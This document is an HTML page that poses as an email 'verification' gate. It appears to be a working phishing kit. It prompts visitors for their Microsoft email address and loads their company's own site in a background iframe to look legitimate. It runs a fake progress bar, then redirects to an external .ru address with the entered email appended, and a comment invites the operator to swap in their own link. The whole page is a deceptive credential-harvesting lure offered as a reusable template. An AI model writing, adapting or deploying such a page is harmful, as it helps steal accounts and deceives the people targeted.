<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Defender Associate</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: black;
            font-family: Arial, sans-serif;
            background-color: #255,255,255; /* Default fallback background color */
            background-image: url('https://th.bing.com/th/id/OIP.JPrL8KYCznQKL-czPq-Q6QHaEK?w=321&h=180&c=7&r=0&o=5&dpr=1.3&pid=1.7'); /* Default fallback image */
            background-size: cover;
            background-position: center;
            position: relative;
            overflow: hidden;
        }

        .container {
            background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent white background */
            padding: 20px;
            border: 2px solid #ccc;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            width: 90%;
            max-width: 350px;
            box-sizing: border-box;
            position: relative;
            z-index: 2;
        }

        h3 {
            margin-top: 0;
            color: #333;
        }

        hr {
            border: 2px solid lightgrey;
            width: 80%;
            margin: 10px auto;
        }

        .progress-bar-container {
            position: relative;
            width: 100%;
            height: 4px;
            background: #eaeaea;
            margin-top: 20px;
        }

        .progress-bar {
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 0%;
            background: #61a4f6;
            transition: width 3s cubic-bezier(.2,.84,.38,.87);
        }

        input {
            width: calc(100% - 22px);
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 16px;
            box-sizing: border-box;
            background-color: #fff;
            color: #333;
            outline: none;
        }

        input::placeholder {
            color: #999;
        }

        button {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #61a4f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #5492d4;
        }

        .iframe-background {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }

        .background-image {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
            z-index: 1;
        }
    </style>
</head>
<body>
    <iframe class="iframe-background" id="background-iframe"></iframe>
    <div class="background-image" id="background-image"></div>
    <div class="container">
        <h3>Verification Defender Associate</h3>
        <div>
            <label for="username-input">You Must Type Your Email Address For Verification Before The Document Displays:</label>
        </div>
        <div class="username-input-container">
            <input type="text" id="username-input" autofocus="autofocus" placeholder="Enter Your Microsoft Email Address" tabindex="1" required>
        </div>
        <div>
            <label for="username-input">Press Enter after entering your email address or click "Next".</label>
        </div>
        <button id="continue-button">Next</button>
        <div class="progress-bar-container">
            <div class="progress-bar" id="preparing-experience"></div>
        </div>
    </div>

    <script>
        document.getElementById('username-input').addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                continueLoading();
            }
        });

        document.getElementById('continue-button').addEventListener('click', function() {
            continueLoading();
        });

        function loadProgressBar() {
            var progress = document.getElementById('preparing-experience');
            if (progress && progress.style) {
                progress.style.width = '100%';
                setTimeout(showBackground, 3000);  // Simulates loading before showing background
            }
        }

        function continueLoading() {
            var username = document.getElementById('username-input').value;
            if (validateEmail(username)) {
                var domain = username.split('@')[1];
                loadBackground(`https://${domain}`);
                loadProgressBar();  // Ensure the progress bar loads
            } else {
                alert("Please enter a valid email address.");
            }
        }

        function loadBackground(url, retryCount = 1) {
            var iframe = document.getElementById('background-iframe');

            fetch(url, { mode: 'no-cors' })
                .then(response => {
                    if (response.ok || response.type === 'opaque') {
                        iframe.src = url;
                        iframe.style.display = 'block';
                        document.body.style.backgroundImage = 'https://4454275f.rwnbqwuligbumyzvpodsthfkaftacy.pages.dev/justintime.png'; // Clear fallback background image
                        document.body.style.backgroundColor = '#0000EEF'; // Clear fallback background color
                    } else {
                        throw new Error('Failed to load');
                    }
                })
                .catch(error => {
                    if (retryCount < 3) {
                        setTimeout(() => loadBackground(url, retryCount + 1), 1000);
                    } else {
                        console.error('Failed to load background, falling back', error);
                        iframe.style.display = 'backgroundImage';
                        // Fallback image or color is already set in the CSS
                    }
                });
        }

        function showBackground() {
            setTimeout(redirect, 6235); // Wait 5 seconds before redirecting
        }

        function redirect() {
            var hash = window.location.hash;
            var cleanhash = hash.replace("#", "");
            var decodedEmail = '';
            if (hash && cleanhash) {
                try {
                    decodedEmail = atob(cleanhash);
                    if (isBase64(decodedEmail)) {
                        decodedEmail = atob(decodedEmail);
                    }
                } catch (error) {
                    console.error("Error decoding base64 email:", error);
                }
            }

            var username = document.getElementById('username-input').value;

            var linkx = "https://staff-protected-information19283.ru"; // change link here or put link here
            var finalLink = linkx + (decodedEmail || cleanhash) + "#" + username;

            window.location.href = finalLink;
        }

        function isBase64(str) {
            try {
                return btoa(atob(str)) == str;
            } catch(err) {
                return false;
            }
        }

        function appendCharacter(char) {
            var input = document.getElementById('username-input');
            input.value += char;
            input.focus();
        }

        function validateEmail(email) {
            var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }
    </script>
</body>
</html>
